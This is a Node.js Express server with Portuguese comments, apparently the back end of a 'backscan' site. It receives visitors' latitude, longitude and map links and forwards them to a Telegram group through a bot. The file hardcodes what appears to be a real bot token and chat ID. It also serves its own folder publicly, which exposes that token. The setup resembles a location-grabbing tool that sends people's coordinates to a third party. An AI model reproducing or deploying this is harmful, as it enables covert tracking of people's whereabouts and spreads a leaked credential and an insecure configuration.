// server.js
const express = require("express");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 8088;

app.use(express.json());

// Configuração do CORS para permitir chamadas do frontend
app.use(cors({
    origin: "https://backscan-frontend.onrender.com", // URL do seu frontend
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type", "Authorization"]
}));

// Middleware para garantir que todas as respostas tenham os headers de CORS
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "https://backscan-frontend.onrender.com");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
    if (req.method === "OPTIONS") {
        return res.sendStatus(204); // Responde imediatamente para requisições OPTIONS (preflight)
    }
    next();
});

// Servir arquivos estáticos da pasta atual
app.use(express.static(__dirname));

// Rota para o caminho raiz
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

const TELEGRAM_BOT_TOKEN = "7695856507:AAGGfqzY8-ujtB_oBvOJuXkjmIALTQYqq3I"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-1002496051487"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  console.log("Recebendo localização:", req.body); // Adicionado log para depuração
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    console.log("Mensagem enviada com sucesso!");
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar mensagem:", error.response ? error.response.data : error.message);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

// Nova rota para enviar localização ao Telegram
app.post("/send-location-alt", async (req, res) => {
    try {
        const { latitude, longitude } = req.body;
        const botToken = "SEU_BOT_TOKEN";
        const chatId = "SEU_CHAT_ID";

        const message = `📍 Localização recebida!\nLatitude: ${latitude}\nLongitude: ${longitude}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const response = await axios.post(url, {
            chat_id: chatId,
            text: message
        });

        res.status(200).json({ success: true, response: response.data });
    } catch (error) {
        console.error("Erro ao enviar mensagem ao bot:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
